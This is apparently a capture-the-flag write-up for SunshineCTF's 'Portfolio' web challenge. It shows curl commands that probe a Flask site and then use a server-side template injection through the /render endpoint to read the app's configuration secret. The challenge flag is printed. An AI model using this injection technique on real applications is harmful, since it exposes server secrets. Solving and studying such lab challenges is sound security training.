# Portfolio
Web, 150 points
## Description
> Check out my development portfolio! I'm just getting started, so don't be too mean :(
## Solution
We visit the attached site and see:
```html
      Welcome to my dev portfolio!
      check out my cool projects
     Projects 
      Custom greeting
      Dynamic page rendering
```
The first link leads to a very simple page:
```console
root@kali:~# curl "http://archive.sunshinectf.org:19009/hello/name" && echo
    Templating in Flask
    Hello name!
    Welcome to the world of Flask!
```
Such challenges usually lead to [template injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection), so let's try that here:
```console
root@kali:~# curl "http://archive.sunshinectf.org:19009/hello/\{\{4*4\}\}" && echo
    Templating in Flask
    Hello {{4*4}}!
    Welcome to the world of Flask!
```
The template was not evaluated, so this page isn't vulnerable to such an attack. 
Moving on, we have we have the "Dynamic page rendering" page:
```console
root@kali:~# curl "http://archive.sunshinectf.org:19009/render.html"  && echo
  Page to load:
    My favorite matches
    Some cool tag teams
    admin-->
```
Let's try to visit all three options (including the commented out admin page):
```console
root@kali:~# curl "http://archive.sunshinectf.org:19009/render" -X POST  --data "template=templates/matches.html" && echo
Some cool matches
root@kali:~# curl "http://archive.sunshinectf.org:19009/render" -X POST  --data "template=templates/teams.html" && echo
some cool teams
root@kali:~# curl "http://archive.sunshinectf.org:19009/render" -X POST  --data "template=templates/admin.html" && echo
Hi there!
```
Nothing much. However, if we inspect "admin.html" directly, we get an interesting result:
```console
root@kali:~# curl "http://archive.sunshinectf.org:19009/templates/admin.html" && echo
{% if config.DEBUG %}
{{config.FLAG}}
{% endif %}
Hi there!
```
In debug mode, the flag would have been outputted. Can we trigger debug mode? Not in an apparent way. However, we can use the "hello" page we saw earlier in order to create a template that would reveal the flag:
```console
root@kali:~# curl "http://archive.sunshinectf.org:19009/hello/\{\{config.FLAG\}\}" && echo
    Templating in Flask
    Hello {{config.FLAG}}!
    Welcome to the world of Flask!
root@kali:~# curl "http://archive.sunshinectf.org:19009/render" -X POST  --data "template=hello/{{config.FLAG}}" && echo
    Templating in Flask
    Hello sun{5l33333p_15_f0r_7h3_w34k}!
    Welcome to the world of Flask!
```